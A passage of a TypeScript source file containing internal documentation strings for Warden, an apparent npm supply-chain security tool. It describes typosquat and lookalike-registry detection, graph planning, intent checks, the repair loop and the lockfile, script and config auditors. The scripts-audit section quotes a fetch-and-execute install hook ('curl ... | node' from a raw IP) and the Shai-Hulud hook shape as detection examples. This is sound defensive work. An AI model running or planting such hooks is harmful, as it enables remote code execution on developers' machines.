\`src/distance/popular.ts\` is a literal array of 108 \`{ name, weekly }\` entries with rounded numbers (\`lodash\` 300M, \`debug\` 358M, \`react\` 25M). It is compiled in, never fetched. The smallest entry is exactly 1,000,000, so the \`popularityGap\` test \`m.targetWeekly >= 1_000_000\` in step 6 is satisfied by every possible match and never excludes anything. The 10,000,000 threshold used for scoped impersonation does discriminate: 77 of the 108 entries qualify. \`popularityOf(name)\` is also used by the engine, where a name being in this table counts as "established" on its own.

## Lookalike registries

\`lookalikeOf(host)\` in \`src/audit/config.ts\` checks, in order: an allowlist of \`registry.npmjs.org\`, \`registry.yarnpkg.com\`, \`registry.npmmirror.com\`; then two brand regexes, \`/(^|[.-])npm-?js([.-]|$)/i\` mapping to \`registry.npmjs.org\` and \`/(^|[.-])yarnpkg([.-]|$)/i\` mapping to \`registry.yarnpkg.com\`; then \`damerau(host, known) <= 2\` against the allowlist. A hit becomes \`config_lookalike_registry\` at level \`block\`; any other unknown host becomes \`config_custom_registry\` at level \`warn\`. The regexes catch \`registry.npmjs.help\` and \`registry.npm-js.org\`; the distance fallback catches \`registry.npmjs.orgg\`, \`registry.npmsj.org\` (transposition), and \`registry.yarn-pkg.com\`. The boundary requirement means \`mynpmjs.com\` is not matched by brand and is too far by distance, so it only warns. \`src/audit/lockfile.ts\` keeps its own copy of the same two patterns as \`IMPERSONATION\`, but no distance check, because any host outside \`TRUSTED_HOSTS\` is already blocked there.

## The hallucinated-name list

\`src/intel/data/hallucinated.json\` holds exactly 10 names, including \`react-codeshift\`, \`express-async-router\`, and \`lodash-utils-extended\`. \`HallucinatedNames\` is a plain \`Set\`, so matching is exact-string only: no normalization, no scope handling, no fuzzy matching. The file's note attributes the names to the USENIX 2025 dataset and Aikido/CSA reporting, and states the intent that a name stays blocked even if someone has since registered it defensively, which the pre-resolution ordering in \`checkPackage\` implements.

## Limitations

The popularity table is 108 hardcoded names, so a typosquat of anything outside it is invisible to steps 4 to 6. The hallucinated list is 10 strings and cannot generalise; unrecognised invented names are caught only if the registry returns a 404, which produces the \`nonexistent-package\` signal instead. \`established\` fails open: \`src/registry.ts\` sets \`downloadsUnknown\` when the downloads endpoint errors or exceeds its 5 second timeout, and \`src/engine.ts\` treats that as established, which suppresses every name-similarity check except the nonexistent-package one. Homoglyph folding covers only the 9 ASCII substitutions listed above, so Unicode lookalikes such as Cyrillic characters are not folded. Lookalike-registry detection knows two brands and three canonical hosts.
`;

const graphInternals = `
Warden's transaction path has four stages that run in order: \`resolveGraph\` in \`src/graph/resolve.ts\` walks the registry to produce a flat set of nodes, \`graphDelta\` in \`src/graph/delta.ts\` diffs that set against what is already installed, \`buildPlan\` in \`src/graph/plan.ts\` vets the changed packages and reaches a decision, and \`applyTransaction\` in \`src/graph/apply.ts\` runs the install with lifecycle scripts suppressed and rolls back if anything fails. Each stage is deterministic and its output is serialisable, which is how \`warden plan\` can write a plan to \`.warden/plans/<plan_id>.json\` and \`warden apply\` can later act on exactly that plan.

## Walking the registry

\`resolveGraph\` takes a list of root requirements (name plus range) and a \`packument\` function. It seeds a FIFO queue with the roots at depth 0 and drains it, so the walk is breadth-first. \`buildPlan\` seeds the roots as \`[...input.existing, ...input.direct]\`, where \`existing\` comes from \`manifestRequirements\` (dependencies, devDependencies, and optionalDependencies of the project \`package.json\`) and \`direct\` is what the user named on the command line.

For each queued requirement the range is first checked by \`isRegistryRange\`. Anything matching \`git\`, \`git+\`, \`github:\`, \`https?:\`, \`file:\`, \`link:\`, \`workspace:\`, \`npm:\`, or \`portal:\` is pushed to \`unresolved\` with the reason \`not a registry range\` and never fetched. Otherwise the packument is loaded once per name and memoised, so a package with fifty dependents costs one request. A rejected or throwing \`packument\` call is caught and treated as a null packument, which surfaces as the reason \`not found on the registry\` rather than an exception.

\`selectVersion\` picks a version in this order: a \`dist-tags\` entry whose key equals the range; then, if the range is \`""\`, \`"*"\`, or \`"latest"\`, the \`latest\` dist-tag falling back to \`maxSatisfying(versions, "*")\`; then an exact version key; then \`maxSatisfying\`. Resolved nodes carry \`integrity\` and \`tarball\` from \`dist\`, the depth at which they were first reached, a \`requiredBy\` list of \`name@version\` labels, \`deprecated\`, and \`platformSpecific\` (true when the manifest declares any \`os\` or \`cpu\`). The \`hooks\` field is the subset of \`LIFECYCLE_HOOKS\`, which is exactly \`["preinstall", "install", "postinstall", "prepare", "prepublish"]\`, present as a non-empty string in \`scripts\`. Children are enqueued from \`dependencies\` and \`optionalDependencies\` at depth + 1. \`peerDependencies\` and bundled dependencies are not walked at all.

## One version per name

\`selected\` is a \`Map\` keyed by package name, so the graph is fully hoisted: one version per name, never a nested tree. Because the queue is FIFO, the shallowest requirement for a name wins, and ties are broken by queue order, which means manifest requirements are processed before newly named ones at the same depth. A later requirement for an already-selected name does not re-resolve. Instead it merges: \`requiredBy\` gains the new dependent, \`depth\` becomes the minimum, and an optional node becomes non-optional if any non-optional dependent needs it. If the already-selected version does not satisfy the new range, an entry is appended to \`conflicts\` with \`selected\`, \`alsoRequired\`, and \`requiredBy\`. Conflicts are recorded, never resolved by backtracking, and they do not by themselves change the plan decision. Cycles and self-references terminate for the same reason: a name already in \`selected\` is never expanded again.

\`complete\` is true only when the graph is not truncated and there are no non-optional entries in \`unresolved\`. Nodes are returned sorted by name.

## Budgets

| Budget | Constant | Default | Effect when hit |
| --- | --- | --- | --- |
| Nodes resolved | \`DEFAULT_MAX_NODES\` in resolve.ts | 750 | \`truncated = true\`, remaining queue entries dropped |
| Packages analyzed | \`DEFAULT_MAX_CHECKS\` in plan.ts | 60 | artifact recorded with verdict \`unchecked\` |

Both are overridable through \`deps.maxNodes\` and \`deps.maxChecks\`, but neither CLI command passes an override, so the shipped defaults are 750 and 60. Truncated requirements are silently dropped from the node set: they do not appear in \`unresolved\`, only the \`truncated\` flag records that the walk was cut short. The check budget is spent in the order added-then-changed, each alphabetical, so it is deterministic but not risk-prioritised. A check that throws still consumes budget and produces an \`unanalyzable\` artifact.

## The diff

\`graphDelta\` compares resolved nodes to an \`InstalledGraph\` read by \`readInstalledGraph\` from the first parseable lockfile among \`package-lock.json\`, \`npm-shrinkwrap.json\`, \`pnpm-lock.yaml\`, \`yarn.lock\`. A node with no installed entry is \`added\`, an identical version increments \`unchanged\`, anything else is \`changed\` with a \`level\` from \`diffLevel\`. Installed names absent from the resolution become \`removed\`, sorted by name.

The interesting field is \`newHooks\`. For an added package it is every hook the package has. For a changed package it is the hooks not present in the installed version's hook list, which \`hooksFromManifest\` reads from \`node_modules/<name>/package.json\`. If that manifest is missing or unreadable, hooks are undefined and every hook counts as new. From this, \`newScriptSurface\` is every touched package with at least one new hook, alongside \`scriptSurface\` (any hook at all), \`platformArtifacts\`, and \`deprecatedIntroduced\`. \`digestGraph\` hashes the sorted \`name@version\` lines with SHA-256.

## Reaching a decision

\`decide\` evaluates in strict precedence and returns at the first match.

| Decision | Trigger |
| --- | --- |
| \`block\` | any \`block\` verdict, any \`unanalyzable\` artifact, or any non-optional unresolved requirement |
| \`needs_approval\` | any entry in \`newScriptSurface\`, any \`unchecked\` artifact, or \`truncated\` |
| \`warn\` | any \`warn\` verdict or any \`deprecatedIntroduced\` entry |
| \`allow\` | none of the above |

Because the function returns early, a plan that reaches \`needs_approval\` never appends warn-level reasons, so \`reasons\` is not a complete list of everything noticed. \`next_actions\` is \`warden explain <package>@<version>\` for a block, one \`warden approve-script ... --hook <first new hook> --plan <id>\` per new-script package for an approval, and \`warden apply <plan_id>\` otherwise. An approval triggered only by unchecked artifacts or a truncated graph has no new scripts to approve, so it falls back to \`warden apply <plan_id>\` as well. \`plan_id\` is \`wtxn_\` plus the first 16 hex characters of SHA-256 over \`command\\ngraph_after\`, so the same command over the same resulting graph always yields the same id. \`coverage.ratio\` is \`analyzed / changed\`, or 1 when nothing changed.

## Applying and rolling back

\`applyTransaction\` first builds an \`ApprovalRequest\` for every hook in \`newScriptSurface\`, fetching each script body through \`deps.scriptBody\`, and matches it against stored approvals. \`matchesApproval\` requires package, version, integrity, hook, and \`script_hash\` (SHA-256 of the trimmed body, truncated to 32 hex characters) to all be equal, so an approval dies when the version, the tarball integrity, or a single character of the script changes. Note that the integrity used comes from the plan artifact, and \`unchecked\` or \`unanalyzable\` artifacts carry none.

A plan with decision \`block\` is refused outright. Missing approvals refuse unless \`--allow-unapproved\` is passed. Otherwise the manifest text is read and held in memory, and the install runs through \`installCommand(manager, packages, true)\`. Suppression is unconditional and applies even when every script is approved, so approval means "we read it", not "we ran it".

Verification then runs \`<manager> run <step>\` for \`test\`, \`typecheck\`, \`build\` in that order, skipping any step the project's \`package.json\` does not define, unless \`--no-verify\` was given. A non-zero install or a failing step writes the original \`package.json\` text back and returns a receipt with result \`rolled_back\`. Otherwise the result is \`applied\`. The receipt records both graph digests, a \`policy_digest\`, the approvals used, and \`suppressed_scripts\` derived from the full \`scriptSurface\`.

## Limitations worth knowing

Script suppression in the apply path depends entirely on \`installCommand\`, which appends \`--ignore-scripts\` for npm and pnpm only. Yarn and Bun installs run with no suppression flag and no environment override, so \`warden apply\` does not stop lifecycle scripts under those two managers. The shim path carries a separate \`SUPPRESS_ENV\` with \`YARN_ENABLE_SCRIPTS=0\`, but \`applyTransaction\` does not use it.

Rollback restores only \`package.json\`. The lockfile and \`node_modules\` are left as the failed install left them. Resolution is a hoisted approximation, not a real npm tree, so it will not reproduce a case where two versions of a package legitimately coexist. Conflicts and version selection can therefore differ from what the manager actually installs.
`;

const intentInternals = `
Warden's intent subsystem answers a narrow question: given the prompt an agent was told to implement, does the resulting diff actually implement it, and does it call APIs that exist? It lives in \`src/intent/\` and is driven by \`warden intent <verb>\` (\`check\`, \`extract\`, \`diff\`, \`symbols\`, \`schema\`; \`check\` is the default when no verb is given). The pipeline is deliberately heuristic-first. Diff parsing, hunk classification, the hallucinated-API scan, preservation checking, and scope-creep detection are all deterministic. A model is used in exactly two places, and one of them has no fallback.

## Exit codes and the verdict rule

\`decide()\` in \`match.ts\` computes the verdict last, from the assembled rows. The rule is a strict cascade: \`block\` if any claim row is \`dropped\` **or** any hallucination was found; otherwise \`warn\` if any row is \`partial\` **or** \`scope_creep\` is non-empty; otherwise \`allow\`. \`exitCodeFor\` maps these through \`EXIT\` to 0 / 10 / 20, and \`wardenFailure\` returns 30 for usage and analysis errors. \`warden intent symbols\` bypasses \`decide\` entirely and returns 20 if it found anything, 0 otherwise.

## The diff becomes classified hunks

\`collectFileDiffs\` runs \`git diff <mergeBase>\` and appends a synthetic unified diff for untracked files built by \`untrackedDiffText\` from \`git ls-files --others --exclude-standard\`. That synthesizer skips \`.warden/\`, \`.git/\`, anything under \`node_modules\`, unreadable files, files containing a NUL byte, and empty files. The merge base comes from \`resolveMergeBase\`: \`--base\` if given, otherwise the first of \`origin/main\` then \`main\` that resolves, otherwise an error.

\`parseUnifiedDiff\` produces \`FileDiff\` records; \`classifyHunks\` numbers hunks \`h1\`, \`h2\`, ... in diff order, skipping binary files. For each file it builds a declaration index from the **post-image on disk**, not the diff: \`toParseable\` transpiles \`.ts\`/\`.mts\`/\`.cts\`/\`.tsx\` through \`Bun.Transpiler\` and marks the result \`exact\` only if the line count is unchanged, then \`indexDeclarations\` walks the acorn AST. If the file is not exact, does not parse, or yields no declarations, it falls back to \`declsFromText\`, a line regex that only accepts unindented top-level declarations and finds the end by brace counting.

\`categorize\` picks the first matching rule, in this order:

| Order | Category | Condition |
| --- | --- | --- |
| 1 | \`deletion\` | file deleted, or zero added lines with at least one removed |
| 2 | \`test_or_doc\` | path matches \`tests?/\`, \`__tests__/\`, \`docs?/\`, or file matches \`.test.\`/\`.spec.\`, \`.md\`, \`.txt\` |
| 3 | \`formatting_only\` | added and removed lines are identical once whitespace is stripped and both are sorted |
| 4 | \`other\` | file is not JS/TS |
| 5 | \`new_function\` | a function or class declaration lies wholly inside the hunk and every one of its lines is an added line |
| 6 | \`signature_change\` | a declaration's first line was added and some removed line contains \`(\` |
| 7 | \`import_added\` / \`import_removed\` | added / removed lines match the import-or-require regex |
| 8 | \`conditional_changed\` | an added line contains \`if\`, \`else\`, \`switch\`, \`case\`, \`while\`, \`for\`, or a ternary |
| 9 | \`assignment_changed\` | assignment-looking added lines are more than half of all added lines |
| 10 | \`other\` | fallback |

Each hunk carries \`symbols\` (declarations overlapping its line range), \`changedSymbols\` (those with at least one added line inside them), \`imports\`, \`addedLines\`, and an \`excerpt\` of the added lines capped by \`capExcerpt\` at 1500 characters, trimmed back to the last newline.

## The prompt becomes claims

\`extractClaims\` makes one model call with a JSON schema requiring \`claim\`, \`kind\`, \`keywords\`, \`sourceText\` per entry, where \`kind\` is one of \`behavior\`, \`preservation\`, \`constraint\`, \`structural\`. \`parseClaims\` rejects the whole payload if any entry is malformed, lowercases keywords, and trims claims. Ids are assigned \`c1\`, \`c2\`, ... in returned order.

## Matching

\`keywordPass\` runs first and never considers \`preservation\` claims. \`tokenize\` splits camelCase, lowercases, splits on non-alphanumerics, drops tokens shorter than 3 characters and a 24-word stopword list, then stems (\`-ing\` when longer than 5, \`-ed\` when longer than 4, \`-s\` when longer than 3). \`keywordScore\` gives 2 points for a token found in the hunk's symbols and 1 for a token found in \`summary + file\`. A match requires **score at least 3, at least one symbol hit, and coverage at least 0.6**, where coverage is hits divided by distinct claim tokens. Any keyword match is recorded as \`delivered\`.

Only non-preservation claims left unmatched go to \`llmPass\`, in a single call. The model sees claim ids and text, and per hunk only \`id\`, \`file\`, \`summary\`, \`symbols\`, \`excerpt\`. It never sees line numbers. \`parseProposals\` discards unknown claim ids, invalid statuses, and any cited hunk id not in the provided set.

\`decide\` prefers a keyword proposal over an LLM proposal for the same claim. Statuses resolve as: \`delivered\` or \`partial\` with at least one valid hunk id keeps that status and cites the hunks; \`dropped\` from the model becomes \`dropped\`; a non-dropped LLM proposal whose citations are all invalid is downgraded to \`partial\` with evidence \`llm asserted without evidence\`; a claim with no proposal becomes \`dropped\`, unless the match call failed, in which case it becomes \`partial\` with \`not verifiable: match llm unavailable\`.

Preservation claims never reach either pass. \`preservationTouches\` looks only at \`changedSymbols\`, so a symbol merely spanned by a sibling addition does not count. A changed symbol violates the claim if all its tokens appear in the claim's tokens, or if some keyword's tokens are all contained in the symbol's tokens. No touching hunk means \`delivered\` with \`no change touches it\`; any touching hunk means \`dropped\`.

Scope creep is every hunk not cited by any resolved claim, whose category is not \`formatting_only\` or \`test_or_doc\`, with \`addedLines >= SCOPE_CREEP_MIN_ADDED_LINES\` (5), sorted by added lines descending.

## The hallucinated-API scan

\`symbolScanFiles\` selects non-binary, non-deleted JS/TS files with at least one added line, reads the post-image, and hands them to \`findHallucinations\`. Bindings come from the acorn AST (\`bindingsFromAst\`) or, when nothing parses, from line regexes (\`bindingsFromText\`); only bare specifiers are tracked. \`propagateInstances\` does one hop of factory tracking: \`const client = axios.create(...)\` binds \`client\` to the surface's \`instance\` entry because that entry's \`via\` list contains \`create\`.

Surfaces resolve curated-first. \`curatedSurface\` covers \`axios\`, \`express\`, \`zod\`, \`lodash\`, \`node:fs\`, \`node:path\`, and maps bare \`fs\`/\`path\` onto the \`node:\` entries. Otherwise \`extractSurface\` reads \`node_modules/<pkg>/package.json\`, resolves the entry through \`exports["."]\` (preferring \`require\`, then \`default\`, then \`import\`, up to two condition levels), then \`main\`, then \`index.js\`, rejects \`.node\`/\`.json\` entries, tries \`rel\`, \`rel.js\`, \`rel/index.js\`, follows at most one \`module.exports = require("...")\` hop, and returns null if it cannot positively resolve a non-empty export set.

A finding is only emitted when the member access is on an added line, the surface is marked \`closed\`, and the member is absent from the resolved member list. \`closed\` is false for \`export *\`, \`Object.assign\`/\`defineProperty\`/\`defineProperties\` on exports, spread or computed keys in the exported object, and unrecognised \`module.exports =\` right-hand sides. Thirteen prototype names (\`then\`, \`catch\`, \`finally\`, \`toString\`, \`valueOf\`, \`hasOwnProperty\`, \`call\`, \`apply\`, \`bind\`, \`constructor\`, \`length\`, \`name\`, \`prototype\`) are skipped. Findings dedupe on package, member, file, and line. The proof lists the first 12 known members and names the origin.

Two real limits: \`extractSurface\` always returns an empty \`instances\` map, so named imports from uncurated packages are never checked; and member accesses are found by a line regex over comment-and-string-stripped source, not by AST resolution, so shadowed or reassigned identifiers can be misattributed.

## Where the model is used, and what happens without one

Exactly two calls: claim extraction and the second matching pass. \`resolveProvider\` honours \`WNPM_LLM_PROVIDER\` (including \`claude\` and \`codex\`, which shell out to a local CLI with a 120 second timeout and need no key), otherwise picks the first of \`openai\`, \`groq\`, \`ollama\` whose key is set. \`WNPM_LLM_MODEL\` overrides the defaults \`gpt-4o-mini\`, \`openai/gpt-oss-20b\`, \`gpt-oss:20b\`. HTTP calls use temperature 0 and a 60 second timeout.

Claim extraction has **no fallback**. If it fails, \`warden intent check\` exits 30, and the error message appends a note naming any hallucinated APIs the deterministic scan already found. The match pass degrades gracefully: \`llmPass\` catches everything and returns \`failed: true\`, which turns unmatched claims into \`partial\` and caps the run at \`warn\` for those claims, while hallucinations still block. \`warden intent diff\` and \`warden intent symbols\` need no model at all, so the symbol scan is fully usable with zero credentials. Note that the reported \`llm.match_calls\` is derived from whether leftover claims existed, so it can read 1 when \`llmPass\` returned early because there were no hunks.

## Integration with warden ci

\`warden ci\` runs the intent pass only when a prompt is available (\`--intent-prompt\` or \`.warden/prompt.txt\`) **and** at least one changed file matches the JS/TS extension pattern. The final CI verdict is the higher of the dependency-guard verdict and the intent verdict on the \`allow < warn < block\` ranking, so a blocking guard finding keeps its own verdict. The GitHub reporter emits an error annotation per dropped claim and per hallucination.
`;

const doctorInternals = `
Warden's repair loop lives in \`src/doctor/\` and runs behind \`warden doctor\` (also \`wnpm doctor\`). One call to \`runDoctor(dir, opts, deps)\` reads the project manifest, audits each direct dependency, proposes upgrade candidates, runs every candidate through the same supply-chain engine that \`warden check\` uses, verifies whole plans in a throwaway copy of the project, and only then writes to the real \`package.json\`. Every stage degrades to a note rather than an exception, so the report is always produced.

## Reading the project

\`loadProject\` in \`project.ts\` parses \`package.json\` (tolerating a UTF-8 BOM via \`stripBom\`) and collects entries from \`dependencies\` and \`devDependencies\` only, tagged \`prod\` and \`dev\` in that order. A name appearing in both groups is audited once, keeping the first occurrence. Transitive dependencies, \`peerDependencies\` and \`optionalDependencies\` are not read at all. Range values are coerced with \`String()\`, so a non-string range does not crash the run.

The installed version comes from \`installedVersion\`, which prefers \`node_modules/<name>/package.json\` and falls back to \`package-lock.json\`, checking \`packages["node_modules/<name>"].version\` then the v1-style \`dependencies[<name>].version\`. The package manager is \`bun\` if \`bun.lock\` or \`bun.lockb\` exists, otherwise \`npm\`.

## The audit pass

\`auditDependency\` runs sequentially per dependency. It calls \`resolvePackage\` for the version list and deprecation flag, then \`fetchVulns\` (an OSV \`/v1/query\` POST with a 10 second timeout). Each outcome has a defined fallback:

| Situation | Behaviour |
|---|---|
| Registry lookup throws | note \`registry lookup failed\`, dependency dropped from the audit |
| \`existsOnRegistry\` false | note \`not found on the registry; skipped\`, dropped |
| No installed version found | falls back to \`minSatisfying(meta.versions, dep.range)\`; if nothing matches, a note is added and the audit continues with no installed version |
| OSV query fails | note \`advisory lookup failed; treating vulnerabilities as unknown\`, and the package is audited as if it had no advisories |

\`skipped\` in the report is \`project.deps.length - audits.length\`, so the dropped dependencies are counted, not hidden. The blocklist (\`defaultBlocklist.match\`) is consulted only when an installed version is known.

\`issuesOf\` then emits, per dependency and in this order: a \`compromised\` issue for a blocklist hit or for an installed version the gate blocked, one \`vulnerability\` issue per advisory that \`affectsVersion\` says applies to the installed version, and a \`deprecated\` issue if the registry marks the package deprecated.

## Gating installed versions and candidates

Before planning, every audited dependency with a known installed version and no blocklist hit is passed to \`check(name@installed)\`, which defaults to \`checkPackage\` from \`src/engine.ts\`. A \`block\` verdict sets \`installedBlocked\`, which becomes a \`compromised\` issue with severity \`critical\`. Verdicts are recorded in \`report.gate\` keyed \`name@version\`, and the same map is reused for candidate checks, so no version is scanned twice.

Candidates come from \`safeUpgrades\`: published versions sorted ascending, excluding prereleases, unparsable versions, anything at or below the installed version, and anything any advisory for that package affects. A candidate must clear every advisory, not just the one that triggered the fix. \`candidateOrder\` then orders them: for \`minimal\`, versions satisfying the declared range first, then the rest, ascending within each part; for \`latest\`, the same safe list reversed. \`selectCandidate\` walks at most \`GATE_ATTEMPTS = 3\` candidates per direction and returns the first whose verdict is not \`block\`. A \`warn\` verdict is accepted.

Only dependencies with a \`vulnerability\` or \`compromised\` issue are planned. A \`deprecated\`-only package produces an issue and nothing else.

## Plans

\`minimalChanges\` uses the minimal pick, falling back to the latest pick if minimal found nothing. \`latestChanges\` uses the latest pick, falling back to the minimal pick. The \`minimal\` plan is always emitted when there are changes; the \`latest\` plan is added only when \`sameChanges\` reports a different name/target pair sequence. Each \`Change\` records \`from\`, \`to\`, whether \`to\` still satisfies the declared range, and the \`diffLevel\` (\`patch\`, \`minor\`, \`major\`).

## Verification

\`verifyPlan\` copies the project directory with \`cpSync\` into a \`mkdtemp\` directory prefixed \`wnpm-doctor-\`, skipping any path whose basename is \`node_modules\`, \`.git\`, \`dist\` or \`coverage\`. \`applyChanges\` rewrites the copy's \`package.json\`, pinning each changed name to the exact version in whichever of \`dependencies\` or \`devDependencies\` contains it, and re-serialises with two-space indentation. Then \`runSteps\` runs, in this order and stopping at the first non-zero exit:

1. install: \`bun install --ignore-scripts\` or \`npm install --ignore-scripts --no-audit --no-fund\`
2. \`test\`, then \`typecheck\`, then \`build\`, each only if that key exists in the project's \`scripts\`, run as \`<pm> run <script>\`

\`--ignore-scripts\` means dependency lifecycle scripts never execute during verification. Each step records name, ok, and elapsed ms. The workspace is removed in a \`finally\`, even when a command throws. \`availablePm\` picks bun when the project is a bun project and bun is on PATH, otherwise npm, otherwise bun, otherwise null. With no package manager, verification is skipped with a note and \`recommended\` falls back to the first plan; the same happens under \`--no-verify\`. Otherwise every plan is verified and \`recommended\` is the first plan that passed, which may be none.

## Applying

\`warden doctor\` applies by default; \`--no-apply\` turns it off. \`applyPlan\` patches the real \`package.json\` and runs a single install in place. No project scripts run at this stage. If the install exits non-zero, or throws, the original manifest text is restored in a \`finally\`. If no plan passed verification there is no recommended plan, so nothing is written. The command exits 0 when there are no issues, 30 when nothing could be audited but something was skipped, and 10 when any issue is not covered by the applied plan's changes.

## When a dependency is unfixable

Exactly two reasons are produced, both for dependencies that had a vulnerability or compromised issue:

- \`no published version fixes the reported issues\`: \`candidateOrder(audit, "minimal")\` is empty, meaning no newer stable published version clears every advisory. This also covers a blocklisted install with no clean sibling release, and an advisory fixed only in a prerelease.
- \`every candidate fix was blocked by the supply-chain gate\`: candidates existed, but the first three in both the minimal and the latest ordering all returned \`block\`.

## Limitations worth knowing

Only direct dependencies are audited. An OSV outage silently produces a clean-looking report plus one note per package. When no installed version can be determined, doctor assumes the lowest version satisfying the range. The gate only inspects three candidates per direction. Applying rewrites the manifest with two-space JSON formatting, which will reformat a manifest that used something else, and pins exact versions rather than preserving the range operator.
`;

const surfacesInternals = `
Warden splits its local analysis into two independent pieces. \`src/audit/\` contains three pure auditors that read repository files and return findings, and \`src/shim/grammar.ts\` contains the parser that decides what a package-manager invocation actually is. Neither touches the network, executes project code, or shells out. The audit side is reached through \`warden check lockfile|scripts|config\`, the grammar side through the PATH shims and through \`warden coverage\` and \`warden shim-plan\`.

## The shared audit contract

All three auditors take an \`AuditFs\` (\`readFile\`, \`exists\`, \`glob\`) and return an \`AuditReport\`: \`{ schema_version: 1, surface, root, scanned, findings, notes }\`. A finding is \`{ rule, level, target, file, line?, evidence, fix }\`, where \`level\` is \`allow\`, \`warn\`, or \`block\`. \`scanned\` counts units examined, which is lock entries for the lockfile surface, manifests for scripts, and key/value pairs for config.

Every failure that is not a finding becomes a string in \`notes\` rather than an exception. A missing lockfile, an unparseable JSON file, an unreadable \`.npmrc\`, and a \`node_modules\` that cannot be listed all produce notes, which is deliberate: it prevents a scan that could not see anything from reading as a clean scan. \`worstLevel()\` in \`types.ts\` reduces the findings to \`block\` if any finding blocks, else \`warn\` if any warns, else \`allow\`, and \`runWardenCheck\` maps that through \`exitCodeFor\` to exit 0, 10, or 20. \`--allow-risky\` rewrites a \`block\` result to exit 10.

## check lockfile

\`auditLockfile\` tries four formats in this order: \`package-lock.json\`, \`npm-shrinkwrap.json\`, \`pnpm-lock.yaml\`, \`yarn.lock\`. Every format present is parsed and audited, not just the first. If none is present, it checks \`bun.lock\` and \`bun.lockb\` and emits an explicit unsupported note; bun lockfiles are never treated as clean.

\`entriesFromNpmLock\` walks the \`packages\` map, skipping the root key \`""\` and any entry with \`link: true\`, and derives the name by stripping everything through the last \`node_modules/\`. Only when that yields zero entries does it fall back to the legacy \`dependencies\` map. \`entriesFromYarnLock\` handles classic and berry in one pass: it reads \`version\`, \`resolved\` (truncated at \`#\`), \`integrity\`, promotes a berry \`checksum\` to \`sha512-<checksum>\` when no integrity was seen, and parses \`resolution:\` so \`name@npm:version\` and protocol resolutions such as \`workspace:packages/ui\` both survive. \`entriesFromPnpmLock\` reads only the top-level \`packages:\` block, treating indent-2 keys as entries and pulling \`integrity\`, \`tarball\`, \`type: git\`, and \`directory\` out of the inline \`resolution:\` map.

\`auditLockEntry\` then applies one rule table to whatever the parsers produced.

| Rule | Level | Trigger |
| --- | --- | --- |
| \`lockfile_git_dependency\` | warn | \`resolved\` scheme starts with \`git\`, or is \`ssh\` |
| \`lockfile_insecure_transport\` | block | scheme is exactly \`http\` |
| \`lockfile_file_dependency\` | warn | scheme is \`file\` |
| \`lockfile_lookalike_registry\` | block | host is untrusted and matches \`/(^\\|[.-])npm-?js([.-]\\|$)/i\` or the \`yarnpkg\` equivalent |
| \`lockfile_off_registry_host\` | block | host is untrusted and matches no brand pattern |
| \`lockfile_missing_integrity\` | block | \`resolved\` present, no \`integrity\`, and the scheme is none of git, ssh, http, file |
| \`lockfile_weak_integrity\` | warn | \`integrity\` starts with \`sha1-\` |

The protocol and host rules are mutually exclusive, one branch at most fires. \`TRUSTED_HOSTS\` is exactly \`registry.npmjs.org\`, \`registry.yarnpkg.com\`, \`registry.npmmirror.com\`.

Limits worth knowing. An entry with no \`resolved\` value and no integrity produces no findings, so a pnpm entry recorded as \`resolution: {}\` is counted in \`scanned\` but never flagged for a missing hash. The sha1 check is the exception: it sits outside the \`resolved\` branch, so a weak hash is still reported on an entry that records no URL; pnpm records a tarball URL only for off-registry sources, so the integrity rule mostly bites on npm and yarn lockfiles. A yarn berry \`workspace:\` resolution has no recognised scheme and no hash, so it is reported as \`lockfile_missing_integrity\`. Unlike the config surface, the lockfile host check does no edit-distance comparison, so a typo host that misses the brand regexes lands as \`lockfile_off_registry_host\`, still blocking but with a different message.

## check scripts

\`auditScripts\` scans the root \`package.json\` plus everything \`glob("node_modules/**/package.json", root)\` returns, and inspects only the five hooks in \`LIFECYCLE_SCRIPTS\`: \`preinstall\`, \`install\`, \`postinstall\`, \`prepare\`, \`prepublish\`. A \`build\` or \`test\` script is not audited even if its contents are hostile. Manifests that fail to parse are skipped silently and do not count toward \`scanned\`.

\`auditScript\` runs six regexes over the raw command string: \`script_pipes_download_to_shell\`, \`script_raw_ip_endpoint\`, \`script_base64_payload\`, \`script_credential_path_access\`, \`script_env_exfiltration\` (all \`block\`), and \`script_inline_node_eval\` (\`warn\`). A command can match several and produce several findings. Only when nothing matches does it emit \`script_lifecycle_present\` at \`warn\`, so every install hook is reported at least once.

This is pattern matching on a string, and the tests say so plainly: a \`preinstall\` of \`node setup_bun.js && node bun_environment.js\`, the Shai-Hulud shape, matches no pattern and yields only the \`warn\`-level \`script_lifecycle_present\`. The blocking rules fire on the armed form, for example \`curl -s http://185.62.57.1/setup_bun.js | node\`.

## check config

\`auditConfig\` reads \`<root>/.npmrc\` labelled \`.npmrc\` and \`<home>/.npmrc\` labelled \`~/.npmrc\`. \`parseNpmrc\` drops blank lines and lines starting with \`#\` or \`;\`, requires an \`=\` at index 1 or later, and records a 1-based \`line\` on every finding.

\`config_insecure_registry\` (block) fires on a \`registry\` or \`*:registry\` key whose value starts with \`http://\`, independently of the host rules, so an \`http://\` lookalike produces two findings. Host classification uses \`lookalikeOf\`, which returns null for the three known hosts, then tries the same brand regexes, then \`damerau(host, known)\` with a distance of 1 or 2. A hit is \`config_lookalike_registry\` (block); any other unknown host is \`config_custom_registry\` (warn). A key containing \`_auth\` or \`_password\` whose value does not start with \`\${\` is \`config_plaintext_credential\` (block), and the evidence and fix strings never echo the value. \`strict-ssl=false\` is \`config_tls_verification_disabled\` (block) and \`ignore-scripts=false\` is \`config_scripts_forced_on\` (warn). Only \`.npmrc\` is read; \`.yarnrc.yml\` and pnpm settings files are not audited.

## Classifying a command

\`planCommand(manager, argv)\` returns a \`CommandPlan\` and never throws. \`npx\` and \`bunx\` short-circuit to \`exec\`. Otherwise \`argv[0]\` is matched against four tables in a fixed order, and the first match wins: \`EXEC_VERBS\`, \`REBUILD_VERBS\`, \`FROZEN_VERBS\`, \`INSTALL_VERBS\`. Anything unmatched, including an empty argv, is \`passthrough\`.

| Kind | Verbs |
| --- | --- |
| exec | npm \`exec\`, \`x\`; pnpm \`dlx\`, \`exec\`; yarn \`dlx\`, \`exec\`; bun \`x\`, \`create\` |
| rebuild | npm \`rebuild\`; pnpm \`rebuild\`, \`approve-builds\`; yarn \`rebuild\`; bun \`pm\` |
| frozen-install | npm \`ci\`, \`clean-install\`, \`install-ci-test\`, \`cit\`; pnpm \`install --frozen-lockfile\`; yarn \`install --immutable\`; bun \`install --frozen-lockfile\` |
